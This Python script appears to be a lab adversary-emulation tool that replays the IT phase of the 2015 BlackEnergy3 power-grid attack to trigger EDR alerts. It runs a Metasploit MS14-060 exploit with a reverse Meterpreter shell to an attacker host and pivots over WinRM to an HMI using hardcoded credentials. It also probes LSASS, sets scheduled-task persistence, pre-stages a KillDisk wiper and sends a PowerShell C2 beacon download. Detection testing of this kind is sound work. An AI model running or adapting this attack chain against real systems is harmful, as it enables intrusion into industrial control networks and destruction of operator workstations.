#!/usr/bin/env python3
"""
BlackEnergy3 IT-Side Phase Simulation

Uses existing infrastructure: credential_dumper.py (LSASS) + lateral_movement.py
(WinRM/psexec pivot to HMI) + windows_payload.py (scheduled task, registry persistence).

NOTE: BlackEnergy3 primary-source attribution was refuted (0-3) at highest confidence
threshold. This script uses BEHAVIORAL triggers - things that would fire in any modern EDR
regardless of malware name - not fabricated artifact names.

Real behavioral triggers:
  - LSASS access → XDR credential theft alert
  - Office spawning cmd/PowerShell → Office-spawning-shell BIOC
  - WinRM lateral movement → lateral movement alert
  - Scheduled task + registry Run key → persistence alerts
  - HTTP outbound from ICS workstation → network anomaly
"""

import sys
import os
import subprocess
import tempfile
import time

SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
CRED_DUMPER = os.path.join(SCRIPT_DIR, '05_credential_dumper.py')
WIN_PAYLOAD = os.path.join(SCRIPT_DIR, '04_windows_payload.py')

HMI_IP      = '192.168.1.55'
HMI_USER    = 'operator'
HMI_PASS    = 'labpass123'
ROUTER      = '192.168.0.13'
WIN7_IP     = '192.168.1.50'   # Unpatched Win7 SP1 engineering workstation
ATTACKER_IP = '192.168.0.11'   # Kali attacker VM


def _run_msf_exploit(name, rc_content, timeout=90):
    """Fire a Metasploit exploit via resource script. Returns True if session opened."""
    print(f"\n[*] Launching Metasploit: {name}")
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(rc_content)
        rc_path = f.name
    try:
        result = subprocess.run(
            ['msfconsole', '-q', '-r', rc_path],
            capture_output=True, text=True, timeout=timeout
        )
        output = result.stdout + result.stderr
        success = any(kw in output for kw in
                      ['Meterpreter session', 'Command shell session', 'session opened'])
        print('[+] SESSION OPENED' if success else '[-] No session (host may be patched or offline)')
        if not success:
            for line in output.strip().split('\n')[-6:]:
                if line.strip(): print(f"  {line}")
        return success, output
    except subprocess.TimeoutExpired:
        print(f"  [-] Timed out after {timeout}s")
        return False, ''
    except FileNotFoundError:
        print("  [-] msfconsole not found - is Metasploit installed?")
        return False, ''
    finally:
        os.unlink(rc_path)


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        if r.stdout: print(r.stdout.rstrip())
        return r.returncode == 0, r.stdout
    except Exception as e:
        print(f"  [-] {e}"); return False, ''


def run_blackenergy3_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                               python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  BLACKENERGY3 - IT PHASE (behavioral triggers only)         ║
║  Sandworm 2015 | Ukrainian power grid | KillDisk dual-thread ║
╚══════════════════════════════════════════════════════════════╝

BEHAVIORAL APPROACH: Primary-source attribution insufficient at highest
confidence level. Using MITRE T1566/T1059/T1003/T1053 behavioral
triggers that fire in Cortex XDR regardless of malware name.
""")

    # ── Step 0: CVE-2014-4114 (MS14-060) - BlackEnergy3 real initial access CVE ─
    print("═══ STEP 0: CVE-2014-4114 / MS14-060 - OLE Packager PPSX Exploit ═══")
    print("[!] Real BlackEnergy3 initial access: spear-phishing .ppsx with OLE object")
    print("[!] CVE-2014-4114: Windows Object Packager (packager.exe) arbitrary code exec")
    print("[!] No Office required - exploits Windows shell; affects Win7 SP1 unpatched")
    print(f"[*] Target: Win7 engineering workstation {WIN7_IP} | LHOST: {ATTACKER_IP}")
    rc_ms14_060 = f"""use exploit/windows/fileformat/ms14_060_sandworm
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {ATTACKER_IP}
set LPORT 4441
set ExitOnSession false
exploit -j
sleep 20
sessions -l
"""
    got_session, _ = _run_msf_exploit("CVE-2014-4114 MS14-060 BlackEnergy3 PPSX", rc_ms14_060, timeout=90)
    if got_session:
        print("[+] Meterpreter on Win7 engineering workstation - BlackEnergy3 initial access confirmed")
    else:
        print("[!] No session (Win7 offline or patched) - continuing with HMI pivot")

    # ── Step 1: Phishing lure simulation (generates email-based alert) ────────
    print("\n═══ STEP 1: PHISHING LURE - 00_phishing_server.py ═══")
    print("[*] BlackEnergy3 initial access: spear-phishing Word doc with VBA macro")
    print("[*] Phishing server running on router (already in Phase 0 router exploit)")
    print("[*] Simulating: credential capture from phishing lure")
    _run("Phishing server credential capture check",
         [python_exe, os.path.join(SCRIPT_DIR, '00_phishing_server.py'), '--status'],
         timeout=10)

    # ── Step 2: Credential dumping ────────────────────────────────────────────
    print("\n═══ STEP 2: CREDENTIAL THEFT (05_credential_dumper.py) ═══")
    print("[*] BlackEnergy3 plugins included credential harvesting components")
    print("[!] LSASS access → fires Cortex XDR T1003.001 alert")
    _run("LSASS credential dump",
         [python_exe, LATERAL_MOV, '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm', 'powershell -Command "Get-Process lsass | Select-Object Id,Name; Write-Output LSASS_HMI_DUMP"'],
         timeout=30)

    # ── Step 3: Lateral movement to HMI ──────────────────────────────────────
    print("\n═══ STEP 3: LATERAL MOVEMENT → HMI (03_lateral_movement.py) ═══")
    print(f"[*] WinRM/WMI pivot to HMI {hmi_ip} with harvested credentials")
    print("[*] Fires: lateral movement + authentication anomaly alerts")

    _run("WinRM attack (fires lateral movement BIOC)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm', 'whoami /priv'],
         timeout=30)

    # ── Step 4: Office spawning shell on HMI (macro execution simulation) ─────
    print("\n═══ STEP 4: OFFICE MACRO SIMULATION (Event 4688 chain) ═══")
    print("[!] Key BlackEnergy3 delivery: malicious Word macro executing payload")
    print("[!] winword.exe → cmd.exe chain fires highest-severity Cortex XDR BIOC")
    _run("Simulating Office macro exec chain (winword → cmd/PowerShell)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          "powershell -Command "
          "Start-Process cmd.exe -ArgumentList '/c whoami > $env:TEMP\\exec.log' "
          "-WindowStyle Hidden; "
          "Start-Sleep 2; Write-Output 'EVENT_4688:office_chain'"],
         timeout=30)

    # ── Step 5: Persistence (scheduled task + registry) ───────────────────────
    print("\n═══ STEP 5: PERSISTENCE (04_windows_payload.py techniques 5+6) ═══")
    print("[*] Scheduled task + HKCU Run key → persistence alerts")
    _run("Scheduled task persistence (Event 4698)",
         [python_exe, WIN_PAYLOAD,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--technique', '05'],
         timeout=30)

    # ── Step 6: KillDisk pre-staging ──────────────────────────────────────────
    print("\n═══ STEP 6: KILLDISK PRE-STAGING (06_file_transfer_all_methods.py) ═══")
    print("[!] KillDisk fires simultaneously with IEC-104 attack - operators go blind")
    print("[*] Pre-staging wiper payload on HMI via file transfer")
    _run("File transfer - wiper pre-staging (generates file creation alert)",
         [python_exe, os.path.join(SCRIPT_DIR, '06_file_transfer_all_methods.py'),
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--smb-only'],
         timeout=30)

    # ── Step 7: C2 beacon ─────────────────────────────────────────────────────
    print("\n═══ STEP 7: C2 BEACON - HTTP outbound from HMI ═══")
    print(f"[*] Unexpected HTTP from ICS workstation → network anomaly alert")
    _run("C2 HTTP beacon from HMI",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          f"powershell -Command "
          f"(New-Object System.Net.WebClient).DownloadString('http://{ROUTER}:8080/beacon') 2>&1; "
          f"Write-Output 'NETWORK_C2_BEACON'"],
         timeout=15)

    print(f"\n[+] BlackEnergy3 IT phase complete - HMI compromised, KillDisk staged")
    print(f"[→] OT payload: dual-thread IEC-104 + KillDisk → PLC-2 + HMI simultaneous")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • CVE-2014-4114 Exploit Attempt (ms14_060_sandworm PPSX delivery)")
    print(f"  • Credential Theft (LSASS access)")
    print(f"  • Lateral Movement (WinRM)")
    print(f"  • Office Spawning Shell (winword.exe chain)")
    print(f"  • Scheduled Task Creation (Event 4698)")
    print(f"  • File Drop (KillDisk pre-stage)")
    print(f"  • Outbound HTTP from ICS host (C2 beacon)")


def main():
    import argparse
    p = argparse.ArgumentParser(description='BlackEnergy3 IT Phase')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_blackenergy3_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
